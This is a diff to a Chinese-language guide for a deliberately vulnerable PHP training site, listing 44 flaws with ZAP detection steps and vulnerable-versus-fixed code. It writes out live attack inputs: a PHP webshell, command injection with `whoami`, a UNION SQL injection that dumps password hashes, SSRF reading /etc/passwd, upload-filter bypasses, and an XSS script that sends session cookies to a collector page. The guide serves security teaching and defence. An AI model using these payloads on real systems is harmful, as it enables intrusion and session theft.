@@ -20,7 +20,7 @@
 | 7 | **隱藏欄位參數竄改 (Mass Assignment)** | `/profile.php` | 「👤 個人資料 (IDOR / 越權)」卡片 | A01:2025-權限控制缺失 | 修改 HTML 中的隱藏欄位 `name="role"` 值為 `admin`，送出修改後直接升權。 |
 | 8 | **任意檔案下載 (Path Traversal)** | `/download.php?file=X` | 「📥 檔案下載 (Path Traversal)」卡片 | A01:2025-權限控制缺失 | 參數輸入 `../src/db.php` 可穿越目錄下載伺服器敏感原始碼。 |
 | 9 | **系統命令注入 (Command Injection)** | `/admin/ping.php` (後台) | 右下角「🔒 管理員後台 (admin/)」內之 Ping 測試功能 | A03:2025-注入攻擊 | 網頁 Ping 測試功能輸入 `127.0.0.1; whoami` 執行系統任意指令。 |
-| 10 | **任意檔案上傳 Webshell** | `/upload.php` | 「📤 大頭貼上傳」卡片 | A01:2025-權限控制缺失 | 上傳包含 `<?php system($_GET['cmd']); ?>` 的 `shell.php` 取得伺服器控制權。 |
+| 10 | **任意檔案上傳 Webshell** | `/upload.php`<br>`/upload_bypass_html.php`<br>`/upload_bypass_js.php`<br>`/upload_bypass_backend.php` | 「📤 大頭貼上傳」卡片 | A01:2025-權限控制缺失 | 拆分為三個關卡：純 HTML accept 限制繞過、前端 JS 限制繞過與不安全後端 Content-Type 標頭檢查繞過。 |
 | 11 | **SSRF (伺服器端請求偽造)** | `/ssrf_demo.php` | 「🌐 SSRF 預覽 (內網探測)」卡片 | A01:2025-權限控制缺失 | 圖片預覽功能輸入 `file:///etc/passwd` 或 `http://db:3306` 探測內網。 |
 | 12 | **XML 外部實體注入 (XXE)** | `/xxe_demo.php` | 「📁 XXE 匯入 (外部實體解析)」卡片 | A01:2025-權限控制缺失 | XML 匯入處提交包含外部實體定義的 XML，讀取伺服器內部敏感檔案。 |
 | 13 | **CORS 跨來源資源共用漏洞** | `/api/ajax_user_info.php` | 「⚡ AJAX 查詢」卡片（異步調用 API） | A02:2025-安全設定缺陷 | 伺服器配置 Access-Control-Allow-Origin 反射 Origin 且 Credentials 為 true，致敏感資料可被跨域讀取。 |
@@ -50,36 +50,79 @@
 | 37 | **子資源完整性缺失 (Missing SRI)** | 全站頁面 (CDN script/link 標籤) | 存取全站任一網頁，點選右鍵「檢視網頁原始碼」 | A02:2025-安全設定缺陷 | 弱點版引入外部 CDN 的 jQuery 與 Bootstrap 時缺少 `integrity` 與 `crossorigin` 屬性，易遭 CDN 投毒劫持。修正版配置了標準 SRI 雜湊值。 |
 | 38 | **目錄清單洩漏 (Directory Browsing)** | `/uploads/` | 直接在網址列存取 `http://localhost:8080/uploads/` | A02:2025-安全設定缺陷 | 弱點版開啟了 Apache 目錄瀏覽功能且無 index 檔案，訪客可列出所有已上傳的檔案與 webshell。修正版使用 `Options -Indexes` 封鎖。 |
 | 39 | **HTTP 標頭 SQL 注入 (Header SQLi)** | `/login.php` (日誌寫入端點) | 存取登入端點，修改 HTTP Request 中的 `User-Agent` 標頭 | A03:2025-注入攻擊 | 弱點版日誌記錄將 `User-Agent` 標頭內容直接字串拼接寫入 SQL 語句中，ZAP 主動掃描可在此觸發 SQLi 注入。修正版使用參數化查詢。 |
+| 40 | **底層緩衝區溢位 (Buffer Overflow)** | `/buffer_overflow.php?input=X` | 「💥 底層緩衝區溢位...」卡片 | A02:2025-安全設定缺陷 (CWE-120) | 呼叫底層 C 程式且未限制字串長度，輸入超長字串會覆寫堆疊造成系統崩潰（Segment Fault）。修正版進行長度驗證與採用安全複製。 |
+| 41 | **EXIF 中繼資料注入 (EXIF Injection)** | `/exif_vulnerability.php` | 「📷 EXIF 中繼資料注入...」卡片 | A03:2025-注入攻擊 (CWE-79 / CWE-89) | 讀取圖片 EXIF 中繼資料寫入資料庫，但寫入時未參數化 (SQLi) 且展示時未轉義 (Stored XSS)。 |
+| 42 | **日誌敏感資訊外洩 (CWE-532)** | `/login.php` (登入端點) | 右上角「前往登入」進入登入頁面 | A09:2025-安全記錄和監控失效 | 登入失敗與登入成功日誌將使用者輸入的明文密碼直接寫入稽核日誌資料庫中，造成密碼洩漏。 |
+| 43 | **Switch 缺少 break 越權 (CWE-484)** | `/admin/logs.php` | 右下角管理員後台「稽核日誌」功能 | A01:2025-權限控制缺失 | 權限判斷 Switch 中漏寫 break 導致 Fall-through 授予低權限角色 (student/teacher) 越權存取管理員日誌。 |
+| 44 | **缺少自訂錯誤頁面 (CWE-756)** | 全站頁面 (無效 URL) | 存取全站不存在的頁面 (例如 `/notexist`) | A02:2025-安全設定缺陷 | 弱點版使用 Apache 預設錯誤頁面，洩漏 Apache/PHP 詳細版本。修正版配置自訂安全錯誤頁。 |
 
 ---
 
 ## A01:2025 - 權限控制缺失 (Broken Access Control)
 
+### 0. 對應 CWE
+- [CWE-284 (Improper Access Control)](https://cwe.mitre.org/data/definitions/284.html) - 存取控制不當
+- [CWE-639 (Authorization Bypass Through User-Controlled Key)](https://cwe.mitre.org/data/definitions/639.html) - 物件層級越權 (IDOR)
+- [CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)](https://cwe.mitre.org/data/definitions/22.html) - 路徑穿越 (Path Traversal)
+- [CWE-434 (Unrestricted Upload of File with Dangerous Type)](https://cwe.mitre.org/data/definitions/434.html) - 任意檔案上傳 Webshell
+
 ### 1. 漏洞頁面與成因
-- **頁面**：`/profile.php?id=X`、`/admin/export_registrations.php`、`/api/profile.php`、`/api/admin_approve.php`
+- **頁面**：`/profile.php?id=X`、`/admin/export_registrations.php`、`/api/profile.php`、`/upload.php`（導引大廳）、`/upload_bypass_html.php`、`/upload_bypass_js.php`、`/upload_bypass_backend.php`
 - **成因**：
   - 前端以參數 `id` 載入個人檔案，但後端未校驗該 ID 是否為當前登入者本人，造成 **IDOR 水平越權**。
   - 後台敏感功能（名冊下載與審核 API）未在後端程式碼檢驗 Session/Token 的 `role` 角色是否為 `admin`，造成 **垂直越權**。
+  - 大頭貼上傳關卡漏洞成因：
+    - **第一關 (HTML 驗證缺陷 - `/upload_bypass_html.php`)**：僅使用 HTML 的 `accept` 屬性進行檔案類型提示篩選，可在檔案選擇框中手動切換為「所有檔案 (*.*)」或 F12 移除屬性直接繞過。
+    - **第二關 (前端 JS 驗證缺陷 - `/upload_bypass_js.php`)**：僅在瀏覽器端使用 JavaScript 在 `onsubmit` 時檢查副檔名。能被攔截工具在中途輕易竄改檔名繞過。
+    - **第三關 (後端弱驗證缺陷 - `/upload_bypass_backend.php`)**：只校驗用戶端傳送的 `Content-Type` 標頭 (如 `image/png`)，一旦被攻擊者在傳輸中竄改標頭，後端即會放行 `.php` Webshell 檔案上傳。
 
 ### 2. ZAP 偵測與手動驗證
-- **ZAP 檢測**：ZAP 難以透過自動化主動掃描識別越權邏輯，但可藉由爬行（Spider）發現未授權可下載的名冊 `/admin/export_registrations.php`。
-- **手動驗證**：
-  1. 使用 `student01` 帳號登入。
-  2. 嘗試存取 `http://localhost:8080/profile.php?id=3` (檢視 student02 的個資)。
-  3. 嘗試存取 `http://localhost:8080/admin/index.php`，驗證低權限帳號能否直接進入後台。
+- **ZAP 檢測**：ZAP 的 **Active Scan** 可以針對這三個上傳分頁進行主動掃描，測試不同副檔名與 Content-Type 的惡意程式碼。
+- **手動驗證與繞過步驟**：
+  1. **第一關測試**：進入 `/upload_bypass_html.php`。點選上傳，彈出對話框預設過濾非圖片。將檔案選擇視窗右下角過濾切換為「所有檔案 (*.*)」即可選取並上傳 <code>shell.php</code>；或者使用瀏覽器 F12 審查元素將 <code>accept="..."</code> 屬性直接刪除。
+  2. **第二關測試**：進入 `/upload_bypass_js.php`。直接選取 `shell.php` 會觸發 JS 彈窗警告。請先選取一個合法的 `image.jpg`，開啟 ZAP 的 **Breakpoint (中斷點)**。點選送出表單，在 ZAP 攔截到請求時，將該區段的 `filename="image.jpg"` 修改為 `filename="shell.php"` 送出。
+  3. **第三關測試**：進入 `/upload_bypass_backend.php`。若直接送出 PHP 檔名，後端會因為 `Content-Type: application/x-php` 擋下。請於 ZAP 攔截到請求時，同時將 `Content-Type: application/x-php` 修改為 `Content-Type: image/png` 後放行，即可繞過後端對 MIME 標頭的信任。
 
 ### 3. 程式修補對照 (Vulnerable vs. Fixed)
-- **弱點版** (`app-vulnerable/public/profile.php`)：
+- **弱點版** (`app-vulnerable/public/profile.php` 與 `upload.php`)：
+  * **個人資料 IDOR**：
   ```php
   $id = $_GET['id'] ?? $_SESSION['user']['id'];
   // 後端直接相信 ID 並從資料庫載入
   ```
-- **修正版** (`app-fixed/public/profile.php`)：
+  * **大頭貼弱驗證上傳**：
+  ```php
+  $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
+  // 脆弱點：信任了可被篡改的客戶端標頭 type
+  if (!in_array($_FILES['avatar']['type'], $allowed_types)) {
+      die("格式不符！");
+  }
+  $destination = $upload_dir . $_FILES['avatar']['name'];
+  move_uploaded_file($file_tmp, $destination);
+  ```
+- **修正版** (`app-fixed/public/profile.php` 與 `upload.php`)：
+  * **個人資料 IDOR 防禦**：
   ```php
   $id = isset($_GET['id']) ? intval($_GET['id']) : $_SESSION['user']['id'];
   if ($id !== $_SESSION['user']['id'] && $_SESSION['user']['role'] !== 'admin') {
       http_response_code(403);
       die("權限不足！");
+  }
+  ```
+  * **大頭貼安全上傳 (雙重驗證與 MIME 真實檢測)**：
+  ```php
+  $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
+  $file_ext = strtolower(pathinfo($_FILES['avatar']['name'], PATHINFO_EXTENSION));
+  
+  // 防護核心：利用 finfo 讀取檔案二進位特徵，不相信 Content-Type 標頭
+  $finfo = new finfo(FILEINFO_MIME_TYPE);
+  $mime_type = $finfo->file($file_tmp);
+  $allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
+  
+  if (in_array($file_ext, $allowed_extensions) && in_array($mime_type, $allowed_mimes)) {
+      // 隨機命名並寫入
+      $new_file_name = bin2hex(random_bytes(16)) . '.' . $file_ext;
+      move_uploaded_file($file_tmp, $upload_dir . $new_file_name);
   }
   ```
 
@@ -88,15 +131,18 @@
 ## A02:2025 - 安全設定錯誤 (Security Misconfiguration)
 
 ### 1. 漏洞頁面與成因
-- **頁面**：全站 Header 標頭、Session Cookie 設定、`/debug.php`
+- **頁面**：全站 Header 標頭、Session Cookie 設定、`/debug.php`、`/cookie_stealer.php`
 - **成因**：
   - 缺乏安全回應標頭（CSP, X-Frame-Options 等），無法防範 Clickjacking 與部分 XSS。
-  - Session Cookie 未設定 `HttpOnly` 與 `SameSite=Lax`。
+  - Session Cookie 未設定 `HttpOnly`（XSS 可讀取 Cookie）與 `SameSite=Lax`。
   - `/debug.php` 將系統環境變數與資料庫明文帳密直接公開給外部訪客。
 
 ### 2. ZAP 偵測與手動驗證
 - **ZAP 檢測**：ZAP 的 **Passive Scan**（被動掃描）極易掃出全站 Missing Security Headers 警告，並能透過爬行掃描發現並解析 `/debug.php` 的敏感資訊。
-- **手動驗證**：在瀏覽器中按 F12 打開開發者工具，檢視 Network 面板中的回應 Headers，或檢查 Application 中的 Session Cookie 是否缺少 HttpOnly 勾選標記。
+- **手動驗證與 Cookie 竊取對照**：
+  - 在瀏覽器中按 F12，檢查 Application 面板中的 Session Cookie（PHPSESSID），發現弱點版缺少 `HttpOnly` 勾選標記。
+  - **竊取驗證**：在弱點版留言板（`/xss_stored.php`）中注入 `document.cookie` 竊取腳本，隨後進入 `/cookie_stealer.php` 收集箱，會發現當前造訪者的 Session ID 已經被成功記錄在竊取清單中。
+  - **防禦對照**：在安全版（Port 8081）執行相同步驟，由於啟用了 `HttpOnly` 保護，JS 無法存取 PHPSESSID，收集箱中只能收到空字串。
 
 ### 3. 程式修補對照
 - **弱點版**：直接調用 `session_start()`，且未輸出安全標頭。
@@ -183,7 +229,7 @@
 - **ZAP 檢測**：ZAP 的 **Active Scan** (主動掃描) 極易偵測出 SQL Injection、反射型 XSS、路徑遍歷與命令注入，會發出 **High Risk** 警報並附帶攻擊 Payload 證據。
 - **手動驗證**：
   - SQLi：在課程詳細網址輸入 `course_detail.php?id=1 UNION SELECT 1,username,password_hash,role,name,email,7 FROM users`，即可在網頁上看到全校密碼雜湊。
-  - XSS：在留言板輸入 `<script>alert(document.cookie)</script>`。
+  - XSS：在留言板輸入 <code>&lt;script&gt;document.write('&lt;img src="/cookie_stealer.php?cookie=' + encodeURIComponent(document.cookie) + '" style="display:none;"&gt;')&lt;/script&gt;</code>，隨後造訪 <code>/cookie_stealer.php</code> 即可在收集箱中看到被竊取的 Cookie。
   - Path Traversal：下載 `/download.php?file=../src/db.php`。
   - Command Injection：在診斷頁面輸入 `127.0.0.1; whoami`。
 
@@ -494,3 +540,170 @@
       die('檔案過大');
   }
   ```
+
+---
+
+## 補充演練 - 底層緩衝區溢位 (Buffer Overflow)
+
+### 0. 對應 CWE
+- [CWE-120 (Buffer Copy without Checking Size of Input)](https://cwe.mitre.org/data/definitions/120.html) - 緩衝區溢位
+
+### 1. 漏洞頁面與成因
+- **頁面**：`/buffer_overflow.php`
+- **成因**：後端 PHP 使用 `exec()` 呼叫一個底層編譯的 C 語言程式，但並未限制傳入參數的長度。底層的 C 程式使用不安全的 `strcpy()`，將超長字串拷貝至固定長度的緩衝區 `char buffer[64]` 中，導致記憶體堆疊被覆寫破壞，程序觸發 `Segmentation fault` (SIGSEGV) 而崩潰。
+
+### 2. ZAP 檢測性與手動驗證
+- **ZAP 檢測**：ZAP 難以通過普通 Web 掃描得知底層記憶體溢位，但若在主動掃描中啟用 Buffer Overflow，ZAP 會發送大於 2048 字元的 Payload。若伺服器因 C 二進位崩潰回傳 HTTP 500 且網頁內容包含 `Segmentation fault` 等字眼，ZAP 即判定存有此漏洞。
+- **手動驗證**：存取 `http://localhost:8080/buffer_overflow.php?input=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`（大於 64 字元），頁面將回傳 500 錯誤與系統崩潰訊息。
+
+### 3. 程式修補對照
+- **弱點版 C 原始碼** (`app-vulnerable/vuln_process.c`)：
+  ```c
+  char buffer[64];
+  strcpy(buffer, argv[1]); // 不安全拷貝
+  ```
+- **修正版 C 原始碼** (`app-fixed/vuln_process.c` 與 `buffer_overflow.php`)：
+  ```c
+  char buffer[64];
+  strncpy(buffer, argv[1], sizeof(buffer) - 1);
+  buffer[sizeof(buffer) - 1] = '\0'; // 安全拷貝
+  ```
+  並且在 PHP 端進行長度限制阻截：
+  ```php
+  if (strlen($input) >= 64) {
+      http_response_code(400);
+      die("偵測到異常超長字串！");
+  }
+  ```
+
+---
+
+## 補充演練 - EXIF 中繼資料注入 (EXIF Injection)
+
+### 0. 對應 CWE
+- [CWE-79 (Improper Neutralization of Input During Web Page Generation)](https://cwe.mitre.org/data/definitions/79.html) - 儲存型 XSS
+- [CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)](https://cwe.mitre.org/data/definitions/89.html) - SQL 注入 (SQLi)
+
+### 1. 漏洞頁面與成因
+- **頁面**：`/exif_vulnerability.php`
+- **成因**：使用者上傳 JPG 圖片後，PHP 後端使用 `exif_read_data()` 讀取相片內嵌的 EXIF 中繼資料（如 Artist、Model）。
+  - **SQL 注入**：後端直接以字串拼接方式將 EXIF 資料寫入資料庫，一旦 Model 欄位含有單引號（例如 `' OR 1=1 -- `），便會破壞 SQL 結構導致 SQL 注入。
+  - **儲存型 XSS**：網頁讀出這些 EXIF 欄位並直接輸出於表格中時未進行安全轉義，如果 Artist 被注入了 HTML/JS 腳本，所有瀏覽該圖片清單的訪客都會遭受 XSS 攻擊。
+
+### 2. ZAP 偵測性與手動驗證
+- **ZAP 檢測**：ZAP 難以直接推測 EXIF 這類二進位文件中的注入點。需手動在 EXIF 中埋入 XSS Payload（如 `exiftool -Artist="<script>alert(1)</script>" test.jpg`）上傳後觀察。
+- **手動驗證**：
+  1. 造訪頁面，下載預置的 `exif-xss-test.jpg` 檔案並上傳，確認網頁隨即跳出預存型 XSS 彈窗。
+  2. 下載預置的 `exif-sqli-test.jpg` 檔案並上傳，確認引發資料庫寫入 SQL 語法報錯。
+
+### 3. 程式修補對照
+- **弱點版** (`app-vulnerable/public/exif_vulnerability.php`)：
+  ```php
+  // 直接字串拼接寫入
+  $sql = "INSERT INTO exif_photos (filename, artist, model) VALUES ('$new_name', '$artist', '$model')";
+  $pdo->exec($sql);
+  
+  // 前端直接輸出
+  echo $row['artist'];
+  ```
+- **修正版** (`app-fixed/public/exif_vulnerability.php`)：
+  ```php
+  // 安全修補 1：使用 Prepared Statement 防範 SQLi
+  $stmt = $pdo->prepare("INSERT INTO exif_photos (filename, artist, model) VALUES (:filename, :artist, :model)");
+  $stmt->execute([':filename' => $new_name, ':artist' => $artist, ':model' => $model]);
+  
+  // 安全修補 2：前端使用 htmlspecialchars 轉義防範 XSS
+  echo htmlspecialchars($row['artist'], ENT_QUOTES, 'UTF-8');
+  ```
+
+---
+
+## 補充演練 - 日誌敏感資訊外洩 (CWE-532)
+
+### 1. 漏洞頁面與成因
+- **頁面**：`/login.php` (將明文寫入後端) 與 `/admin/logs.php` (管理後台稽核日誌)
+- **成因**：系統記錄登入成功活動時，未將密碼等敏感資料排除，直接將密碼明文記錄在審計日誌中；同時，對於登入失敗 (爆破攻擊) 則完全不予記錄（維持 A09:2025 記錄缺失的漏洞設計）。一旦日誌資料庫或檔案外洩，成功登入者的密碼都將直接被管理員或攻擊者竊取。
+
+### 2. 手動驗證與 ZAP 檢驗
+- **手動驗證**：
+  1. 使用正確帳密（如 `student01` / `password123`）登入弱點版網站。
+  2. 存取管理員日誌區 `http://localhost:8080/admin/logs.php`，會看到剛才成功的記錄中赫然寫著 `Username: student01, Password: password123`。
+  3. 嘗試使用錯誤帳密登入，並重新整理日誌，會發現完全沒有產生任何登入失敗日誌，維持了日誌記錄缺失的防禦缺陷。
+
+### 3. 程式修補對照
+- **弱點版** (`app-vulnerable/public/login.php`)：
+  ```php
+  // 不安全：登入成功日誌內容含有明文密碼變數 $password
+  write_audit_log($pdo, "登入成功 (Username: $username, Password: $password)");
+  ```
+- **修正版** (`app-fixed/public/login.php`)：
+  ```php
+  // 安全：排除密碼敏感欄位，僅記錄事件
+  write_audit_log($pdo, "登入成功");
+  ```
+
+---
+
+## 補充演練 - Switch 缺少 break 越權 (CWE-484)
+
+### 1. 漏洞頁面與成因
+- **頁面**：`/admin/logs.php`（後端調用 `get_user_permissions()` 函數）
+- **成因**：在 Switch 分配角色權限時，漏寫了 `break` 語句。這導致代碼執行時產生 Fall-through（直通現象）。當一個 `student` 登入時，程式匹配到 `case 'student'` 並賦予對應權限後，會一路往下執行，最終在 `case 'admin'` 被覆寫並多拿到了 `admin_access` 權限。
+
+### 2. 手動驗證與 ZAP 檢驗
+- **手動驗證**：
+  1. 以普通學生 `student01` 登入弱點版。
+  2. 直接存取稽核日誌頁面 `http://localhost:8080/admin/logs.php`。
+  3. 發現非管理員身分居然可以繞過防禦成功進入，這代表 `check_login` 呼叫的 `get_user_permissions` 發生了直通越權 Bug。而在安全版 `http://localhost:8081/admin/logs.php` 則會被彈出拒絕。
+
+### 3. 程式修補對照
+- **弱點版** (`app-vulnerable/src/helpers.php`)：
+  ```php
+  switch ($role) {
+      case 'student':
+          $permissions[] = 'view_courses';
+          // 漏洞點：缺少 break!
+      case 'teacher':
+          $permissions[] = 'view_registrations';
+          // 漏洞點：缺少 break!
+      case 'admin':
+          $permissions[] = 'admin_access';
+          break;
+  }
+  ```
+- **修正版** (`app-fixed/src/helpers.php`)：
+  ```php
+  switch ($role) {
+      case 'student':
+          $permissions[] = 'view_courses';
+          break; // 安全修補
+      case 'teacher':
+          $permissions[] = 'view_registrations';
+          break; // 安全修補
+      case 'admin':
+          $permissions[] = 'admin_access';
+          break;
+  }
+  ```
+
+---
+
+## 補充演練 - 缺少自訂錯誤頁面 (CWE-756)
+
+### 1. 漏洞頁面與成因
+- **頁面**：全站無效網址，例如 `/doesnotexist.php`
+- **成因**：網站未配置 `ErrorDocument` 自訂錯誤處理機制。當使用者存取不存在的頁面時，Apache 會直接回傳預設的 HTML 錯誤頁面，其底部通常會自動輸出伺服器精確的 OS、Apache 與 PHP 版本資訊（Version Signature），增加攻擊者進行定向漏洞分析的風險。
+
+### 2. 手動驗證與 ZAP 檢驗
+- **ZAP 檢測**：ZAP 爬蟲在遇到 404 回應時，被動掃描會自動解析其 Server 標頭與錯誤網頁內容，一旦偵測到含有版本號特徵，會觸發 `Information Disclosure` 警告。
+- **手動驗證**：存取 `http://localhost:8080/nonexistent_page`，檢視網頁底部，會看到 Apache 與 PHP 的詳細版本資訊。
+
+### 3. 程式修補對照
+- **弱點版**：無配置 ErrorDocument，任由預設 404 頁面輸出伺服器簽章。
+- **修正版** (`app-fixed/public/.htaccess` 與 `error_404.php`)：
+  在 `.htaccess` 中定義：
+  ```apache
+  ErrorDocument 404 /error_404.php
+  ErrorDocument 500 /error_500.php
+  ```
+  並在 `error_404.php` 中呈現不含任何 Server 版本資訊的精美自訂錯誤畫面。
